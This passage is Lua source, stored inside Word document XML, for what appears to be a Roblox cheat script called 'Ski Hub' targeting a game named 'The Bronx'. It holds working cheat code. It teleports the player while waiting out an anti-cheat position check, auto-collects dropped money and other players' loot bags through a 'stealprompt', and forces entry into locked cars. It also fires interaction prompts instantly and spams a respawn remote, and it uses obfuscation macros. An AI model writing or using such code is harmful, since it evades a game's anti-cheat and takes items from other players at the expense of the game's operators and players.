    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.RichText = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.Text = '&lt;font color="rgb(255,255,255)"&gt;Ski Hub&lt;/font&gt;\n' .. Title</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.BackgroundTransparency = 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.TextSize = 36</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.TextStrokeTransparency = 0.8 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.TextXAlignment = Enum.TextXAlignment.Center</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.TextYAlignment = Enum.TextYAlignment.Center</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.TextWrapped = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.AnchorPoint = Vector2.new(0.5, 0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.Parent = getgenv().HideScreenGUI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Timing then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local startTime = tick()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local endTime = startTime + Timing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        while tick() &lt; endTime do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local timeLeft = endTime - tick()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            textLabel.Text = string.format(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                '&lt;font color="rgb(255,255,255)"&gt;Ski Hub&lt;/font&gt; \n%s\nplease wait : &lt;font color="rgb(255,255,255)"&gt;%.2f&lt;/font&gt; seconds',</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Title, math.max(timeLeft, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            )</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end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</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return textLabel</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)            </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            DeleteSecretUI = LPH_NO_VIRTUALIZE(function(Title)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if getgenv().HideScreenGUI then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    getgenv().HideScreenGUI:Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    getgenv().HideScreenGUI = nil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--old tp start</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        --[[getgenv().Teleport = LPH_NO_VIRTUALIZE(function(CFrame, DontUi)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not LocalPlayer.Character then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not LocalPlayer.Character:FindFirstChild("Humanoid") then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --[[if not DontUi then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    HideUI("teleporting.\nplease wait.")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end]]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --[[LocalPlayer.Character:FindFirstChild("Humanoid"):ChangeState(0)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                repeat task.wait() until not LocalPlayer:GetAttribute("LastACPos")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayer.Character:FindFirstChild("Humanoid"):ChangeState(2)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --[[if not DontUi then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    DeleteSecretUI()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end]]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --[[return true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)]]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>-- old tp end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            --new tp</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>getgenv().Teleport = LPH_NO_VIRTUALIZE(function(CF, DontUi)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not LocalPlayer.Character then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local hum = LocalPlayer.Character:FindFirstChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not hum or not hrp then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hum.WalkSpeed = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hum.JumpPower = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hum.AutoRotate = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hum:ChangeState(0)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    repeat task.wait() until not LocalPlayer:GetAttribute("LastACPos")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hrp.CFrame = CF</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hum:ChangeState(2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hum.WalkSpeed = 16</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hum.JumpPower = 50</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hum.AutoRotate = true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    return true </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">           -- new tp end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">           -- experimantal teleport</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>--[[getgenv().Teleport = LPH_NO_VIRTUALIZE(function(CF, DontUi)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not LocalPlayer.Character then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local char = LocalPlayer.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local hum = char:FindFirstChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local hrp = char:FindFirstChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not hum or not hrp then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hrp.Anchored = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hum.AutoRotate = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hum:ChangeState(0)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    repeat task.wait() until not LocalPlayer:GetAttribute("LastACPos")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hrp.CFrame = CF</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.wait(0.1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hum:ChangeState(2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hrp.Anchored = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hum.AutoRotate = true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    return true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)]]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            GetWorkingSafe = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local House; local Safe;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in workspace["1# Map"]["2 Crosswalks"].Safes:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Value:IsA("Model") and Value.Name == "Safe" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Value.WorldPivot == CFrame.new(-1479.46631, 285.26355, -928.890564, 0, 0, 1, -1, 0, 0, 0, -1, 0) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Safe = Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            break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/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return Safe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            CollectDroppedMoney = LPH_NO_VIRTUALIZE(function()  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not Config.TheBronx.Farms.CollectDroppedMoney then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local OldCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in next, {Workspace.Dollas:GetChildren()} do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for _Index, _Value in Value do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not _Value:IsA("Part") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport(_Value.CFrame + Vector3.new(0, 3.5, 0))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(_Value.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(_Value.ProximityPrompt.HoldDuration)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Teleport(OldCFrame)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local GunNames = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for Index, Value in Lighting:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Value:IsA("Tool") and Value:FindFirstChild("Setting") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.insert(GunNames, Value.Name)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CollectLootBags = LPH_NO_VIRTUALIZE(function()  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not Config.TheBronx.Farms.CollectDroppedLoot then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local OldCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in next, {Workspace.Storage:GetChildren()} do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for _Index, _Value in Value do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not _Value:IsA("MeshPart") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if _Value:FindFirstChild("PlayerName").Value == LocalPlayer.Name then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local _GunFound = true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        --[[if Config.TheBronx.Farms.OnlyCollectGuns then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            _GunFound = false; for __Index, __Value in _Value.Container:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if table.find(GunNames, __Value.Name) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    _GunFound = true;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end]]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if _GunFound == false then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport(_Value.CFrame + Vector3.new(0, 3.5, 0))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(_Value.stealprompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(_Value.stealprompt.HoldDuration)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return true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Workspace.Storage.ChildAdded:Connect(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.spawn(CollectLootBags)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Workspace.Dollas.ChildAdded:Connect(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.spawn(CollectDroppedMoney)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            WashMoney = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- TODO</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            DryMoney = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- TODO</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            RunService.PreRender:Connect(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not Config.TheBronx.PlayerModifications.FastRespawn then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not LocalPlayer.Character then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FireServer(ReplicatedStorage.LoadCharacter)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end))         </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ProximityPromptService.PromptButtonHoldBegan:Connect(function(Prompt, Self)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Prompt and Self == LocalPlayer and fireproximityprompt then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.TheBronx.PlayerModifications.InstantInteract then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(Prompt, true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.TheBronx.PlayerModifications.BypassLockedCars then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Self == LocalPlayer then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            while true do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if Prompt.Parent:FindFirstChild("DriveSeat") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if Prompt:IsA("VehicleSeat") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        Prompt:Sit(LocalPlayer.Character.Humanoid)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        Prompt = Prompt.Parent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    break</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Prompt = Prompt.Parent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if not Prompt.Parent then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    break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local Teleport_Debounce = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            UserInputService.InputBegan:Connect(LPH_NO_VIRTUALIZE(function(Input, Game_Event)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not library then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not library.flags then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Game_Event then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Input.UserInputType == Enum.UserInputType.MouseButton1 and library.flags["ClickTeleport_TheBronx"] and Config.TheBronx.ClickTeleportActive then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local MouseLocation = UserInputService:GetMouseLocation()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Ray = Camera:ViewportPointToRay(MouseLocation.X, MouseLocation.Y)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local RaycastParams = RaycastParams.new()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    RaycastParams.FilterType = Enum.RaycastFilterType.Blacklist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    RaycastParams.FilterDescendantsInstances = {LocalPlayer.Character, Workspace:FindFirstChild("Cameras"), Workspace:FindFirstChild("CameraLocations")}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Cast = Workspace:Raycast(Ray.Origin, Ray.Direction * 1000, RaycastParams)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Cast and not Teleport_Debounce then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport_Debounce = true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport(CFrame.new(Cast.Position + Vector3.new(0,3,0)))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport_Debounce = false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if Workspace:FindFirstChild("GUNS") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in Workspace:FindFirstChild("GUNS"):GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Value:IsA("Model") then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Price = Value:FindFirstChild("Price", true).Value;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Price == 0 then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Price &gt; 100000 then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Price &lt; 10 then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not table.find(Config.Guns, Value.Name.." - $"..tostring(Price)) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        table.insert(Config.Guns, Value.Name.." - $"..tostring(Price));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            table.sort(Config.Guns, LPH_NO_VIRTUALIZE(function(a,b)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return a&lt;b</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end)()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local Fonts = {}; do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local function RegisterFont(Name, Weight, Style, Asset)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if isfile(library.directory.."/assets/"..Asset.Id) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            delfile(library.directory.."/assets/"..Asset.Id)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        writefile(library.directory.."/assets/"..Asset.Id, Asset.Font)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Data = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            name = Name,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            faces = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
